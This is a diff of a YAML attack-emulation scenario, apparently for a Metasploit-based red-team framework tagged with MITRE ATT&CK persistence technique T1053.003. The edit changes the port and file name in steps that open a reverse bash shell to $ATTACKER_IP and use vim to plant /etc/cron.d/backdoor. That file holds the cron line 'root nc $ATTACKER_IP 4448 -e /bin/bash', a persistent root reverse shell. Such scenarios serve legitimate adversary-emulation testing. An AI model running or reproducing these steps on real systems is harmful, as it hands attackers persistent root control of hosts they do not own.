@@ -41,7 +41,7 @@ commands:
     payload: cmd/unix/reverse_bash
     payload_options:
       LHOST: $ATTACKER_IP
-      LPORT: "4445"
+      LPORT: "4448"
     background: true
     kill_on_exit: true
     metadata:
@@ -53,7 +53,7 @@ commands:
   # The file does not exist yet - vim will create it on save.
   - type: msf-session
     session: $SESSION_NAME
-    cmd: "vim /etc/cron.d/backdoor7"
+    cmd: "vim /etc/cron.d/backdoor"
 
   - type: sleep
     seconds: 5   # wait for vim to fully load
@@ -76,7 +76,7 @@ commands:
 
   - type: msf-session
     session: $SESSION_NAME
-    cmd: "1 * * * * root nc $ATTACKER_IP 4445 -e /bin/bash"
+    cmd: "1 * * * * root nc $ATTACKER_IP 4448 -e /bin/bash"
     metadata:
       tactic: "TA0003"
       technique: "T1053.003"
